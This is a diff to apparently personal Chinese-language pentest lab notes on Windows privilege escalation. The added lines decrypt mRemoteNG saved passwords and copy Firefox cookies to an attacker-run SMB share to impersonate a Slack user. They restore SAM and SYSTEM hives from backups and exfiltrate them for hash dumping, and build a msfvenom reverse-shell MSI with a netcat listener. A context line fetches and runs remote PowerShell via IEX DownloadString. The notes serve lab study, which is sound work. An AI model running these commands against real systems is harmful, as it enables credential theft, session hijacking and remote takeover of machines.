@@ -226,6 +226,7 @@ Web 浏览器
 
 mRemoteNG 是一个用于管理和连接远程系统的工具，它使用 VNC、RDP、SSH 和类似协议
 默认情况下，配置文件位于 %USERPROFILE%\APPDATA\Roaming\mRemoteNG                        confCons.xml
+        cmd /c more "%USERPROFILE%\APPDATA\Roaming\mRemoteNG\confCons.xml"
         python3 mremoteng_decrypt.py -s 'HASH'        如果用户没有设置自定义主密码
         python3 mremoteng_decrypt.py -s 'HASH' -p PSWD        如果有
                 https://github.com/haseebT/mRemoteNG-Decrypt
@@ -237,10 +238,13 @@ python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwS
 Cookies
 **
 Firefox 将 cookies 保存在一个名为 cookies.sqlite 的 SQLite 数据库文件中。该文件位于每个用户的 APPDATA 目录 %APPDATA%\Mozilla\Firefox\Profiles\<RANDOM>.default-release
-        C:\htb> copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .                        复制
+        sudo impacket-smbserver share ./ -smb2support                在ATC开SMB，接受cookie
+        C:\htbcopy C:\Users\Grace\AppData\Roaming\Mozilla\Firefox\Profiles\wu7k463d.default-release\cookies.sqlite \\PWNIP\share
+                OR        C:\htb> copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .                        复制
         python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d                破解
                 https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py
         https://cookie-editor.com/        修改网页版聊天slack.com的cookie，impersonate
+        刷新页面
 **
 基于 Chromium 的浏览器也将其 cookies 信息存储在 SQLite 数据库中。唯一的区别是 cookie 值是使用数据保护 API (Data Protection API, DPAPI) 加密的
 C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSh
@@ -269,3 +273,51 @@ Web 和数据库服务器
 源代码管理服务器
 备份服务器
 
+Restic 是一个现代化的备份程序
+        https://github.com/restic/restic/releases/tag/v0.19.1
+
+C:\htb> mkdir E:\restic2; restic.exe -r E:\restic2 init        创建备份目录
+C:\htb> $env:RESTIC_PASSWORD = 'Password'
+C:\htb> restic.exe -r E:\restic2\ backup C:\SampleFolder        备份C:
+C:\htb> restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot                VSS备份
+C:\htb> restic.exe -r E:\restic2\ snapshots                看备份ID
+C:\htb> restic.exe -r E:\restic2\ restore 备份ID --target C:\Restore                在C:\Restore恢复备份
+
+如果是 Linux 备份，检查像 /etc/shadow 这样的文件来破解用户凭证，检查 Web 配置文件，以及在 .ssh 目录中寻找 SSH 密钥等
+如果是 Windows 备份，寻找 SAM 和 SYSTEM 配置单元 (hive) 来提取本地帐户哈希。还可以识别 Web 应用程序目录和存储凭证或敏感信息的常见文件，如 web.config
+
+sudo impacket-smbserver share ./ -smb2support
+copy C:\Users\jeff\Restore\C\Windows\System32\config\SAM \\PWNIP\share\
+copy C:\Users\jeff\Restore\C\Windows\System32\config\SYSTEM \\PWNIP\share\
+impacket-secretsdump -sam SAM -system SYSTEM local
+
+***
+Miscellaneous
+https://lolbas-project.github.io/
+
+**
+certutil.exe，其预期用途是处理证书，但也可以通过将文件下载到磁盘或对文件进行 base64 编码/解码来传输文件
+        https://lolbas-project.github.io/lolbas/Binaries/Certutil/
+C:\htb> certutil -encode file1 encodedfile
+C:\htb> certutil -decode encodedfile file2
+
+**
+rundll32.exe 这样的二进制文件可以用来执行 DLL 文件
+
+PS C:\htb> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer                查看注册键，通过禁用上述两个本地组策略设置可以缓解此问题
+PS C:\htb> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+
+msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi        生成msi
+
+C:\htb> msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart                执行msi
+
+nc -lnvp 9443
+
+计划任务
+可以使用 schtasks 命令来枚举                https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks
+C:\htb>  schtasks /query /fo LIST /v
+OR PS
+C:\htb> Get-ScheduledTask | select TaskName,State
+        https://learn.microsoft.com/en-us/powershell/module/scheduledtasks/get-scheduledtask?view=windowsserver2019-ps
+
+C:\htb> .\accesschk64.exe /accepteula -s -d C:\Scripts\                使用微软 Sysinternals 官方经典工具 AccessChk（这里是 64 位版本 accesschk64.exe）来递归检查指定目录权限
